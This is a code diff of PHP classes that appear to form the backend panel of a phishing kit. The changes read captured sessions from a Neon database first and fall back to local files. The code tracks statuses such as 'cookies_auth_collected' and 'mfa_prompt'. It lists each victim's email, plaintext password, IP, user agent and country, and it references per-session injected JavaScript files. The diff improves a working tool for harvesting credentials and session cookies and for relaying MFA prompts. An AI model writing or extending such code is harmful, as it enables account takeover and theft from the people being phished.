@@ -650,15 +650,29 @@ class Database {
 
     public function getEventInfo($cookieId) {
         $cookieId = Security::sanitizeId($cookieId);
+        // Neon is authoritative — check there first
+        $row = NeonDB::get($cookieId);
+        if ($row) return $row;
+        // Fallback to filesystem
         $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
         if (file_exists($filePath)) {
             return json_decode(file_get_contents($filePath), true);
         }
-        $row = NeonDB::get($cookieId);
-        return $row ?: null;
+        return null;
     }
 
     public function getLatestEventByEmail($email) {
+        // Query Neon first
+        try {
+            $pdo = NeonDB::pdo();
+            if ($pdo) {
+                $stmt = $pdo->prepare("SELECT * FROM sessions WHERE email = :email ORDER BY updated_at DESC LIMIT 1");
+                $stmt->execute([':email' => $email]);
+                $row = $stmt->fetch(\PDO::FETCH_ASSOC);
+                if ($row) return $row;
+            }
+        } catch (\Throwable $e) {}
+        // Fallback to filesystem
         $files = glob($this->storageDir . '/session_*.json');
         if (empty($files)) return null;
 
@@ -1454,39 +1468,57 @@ class Api {
 
         $sessionId = Security::sanitizeId($sessionId);
 
-        // Neon DB is the single source of truth — the worker writes status there.
-        // No filesystem fallback: if it's not in Neon, no session exists yet.
+        // Neon DB is the authoritative source for worker results (failed, mfa_prompt, cookies_auth_collected)
+        // Filesystem is the fallback for sessions created locally before worker picks them up
         $neonRow = NeonDB::get($sessionId);
 
-        if (!$neonRow) {
-            echo json_encode(['status' => 'pending']);
-            exit;
+        // If Neon has a terminal status, use it immediately
+        if ($neonRow) {
+            $st = $neonRow['status'] ?? 'pending';
+            $data = $neonRow['data'] ?? null;
+            if (is_string($data)) $data = json_decode($data, true);
+
+            switch ($st) {
+                case 'cookies_auth_collected':
+                case 'completed':
+                case 'mfa_accepted':
+                    echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
+                    exit;
+
+                case 'mfa_prompt':
+                    echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
+                    exit;
+
+                case 'failed':
+                    $err = $data['error'] ?? 'Login failed.';
+                    echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
+                    exit;
+
+                case 'pending':
+                case 'processing':
+                    // Still waiting for worker — fall through to filesystem check
+                    break;
+
+                default:
+                    echo json_encode(['status' => $st]);
+                    exit;
+            }
         }
 
-        $st = $neonRow['status'] ?? 'pending';
-        $data = $neonRow['data'] ?? null;
-        if (is_string($data)) $data = json_decode($data, true);
-
-        switch ($st) {
-            case 'cookies_auth_collected':
-            case 'completed':
-            case 'mfa_accepted':
-                echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
-                break;
-
-            case 'mfa_prompt':
-                echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
-                break;
-
-            case 'failed':
-                $err = $data['error'] ?? 'Login failed.';
-                echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
-                break;
-
-            default:
-                echo json_encode(['status' => $st]);
-                break;
+        // Fallback: read from local filesystem (for sessions created by PHP before worker picks them up)
+        $storageDir = realpath(__DIR__ . '/../session_data');
+        if ($storageDir) {
+            $sessionFile = $storageDir . '/session_' . $sessionId . '.json';
+            if (file_exists($sessionFile)) {
+                $data = json_decode(file_get_contents($sessionFile), true);
+                $status = $data['status'] ?? 'pending';
+                echo json_encode(['status' => $status]);
+                exit;
+            }
         }
+
+        // No session found anywhere — still pending
+        echo json_encode(['status' => 'pending']);
         exit;
     }
 
@@ -1904,10 +1936,44 @@ class Api {
         try {
             $baseDir = realpath(__DIR__ . '/..');
             $storageDir = $baseDir . '/session_data';
-            
-            $files = glob($storageDir . '/session_*.json');
             $events = [];
-            
+            $seenCookies = [];
+
+            // 1. Query Neon DB first (authoritative)
+            try {
+                $pdo = NeonDB::pdo();
+                if ($pdo) {
+                    $rows = $pdo->query("SELECT * FROM sessions ORDER BY updated_at DESC LIMIT 200");
+                    foreach ($rows as $row) {
+                        $cid = $row['cookie_id'] ?? '';
+                        if (!$cid) continue;
+                        $seenCookies[$cid] = true;
+                        $data = $row['data'] ?? null;
+                        if (is_string($data)) $data = json_decode($data, true);
+                        $err = is_array($data) ? ($data['error'] ?? '') : '';
+                        $events[] = [
+                            'type' => 'neon_session',
+                            'emailMask' => $row['email'] ?? 'unknown',
+                            'domain' => '',
+                            'attempt' => 0,
+                            'password' => $row['password'] ?? 'unknown',
+                            'ip' => $row['ip'] ?? '0.0.0.0',
+                            'ua' => $row['ua'] ?? 'unknown',
+                            'country' => $row['country'] ?? 'XX',
+                            'time' => $row['updated_at'] ?? $row['created_at'] ?? date('c'),
+                            'cookieId' => $cid,
+                            'botStatus' => $row['status'] ?? 'pending',
+                            'error' => $err,
+                            'hasScript' => false,
+                        ];
+                    }
+                }
+            } catch (\Throwable $e) {
+                Security::log("API get_events Neon query failed: " . $e->getMessage());
+            }
+
+            // 2. Local filesystem fallback (for sessions not yet picked up by worker)
+            $files = glob($storageDir . '/session_*.json');
             foreach ($files as $file) {
                 $data = json_decode(file_get_contents($file), true);
                 if (!$data) continue;
@@ -1915,8 +1981,11 @@ class Api {
                 $cookieId = $data['cookieId'] ?? $data['cookie_id'] ?? null;
                 if (!$cookieId) continue;
                 $cookieId = Security::sanitizeId($cookieId);
+                // Skip if already loaded from Neon
+                if (isset($seenCookies[$cookieId])) continue;
+                $seenCookies[$cookieId] = true;
+
                 $botStatus = $data['status'] ?? 'pending';
-                
                 $event = [
                     'type' => $data['type'] ?? 'unknown',
                     'emailMask' => $data['emailMask'] ?? 'unknown',
@@ -1928,7 +1997,8 @@ class Api {
                     'country' => $data['country'] ?? 'XX',
                     'time' => $data['created_at'] ?? $data['time'] ?? date('c'),
                     'cookieId' => $data['cookieId'] ?? 'unknown',
-                    'botStatus' => $botStatus
+                    'botStatus' => $botStatus,
+                    'error' => '',
                 ];
                 
                 $scriptFile = $storageDir . '/inject_session_' . ($data['cookieId'] ?? 'unknown') . '.js';
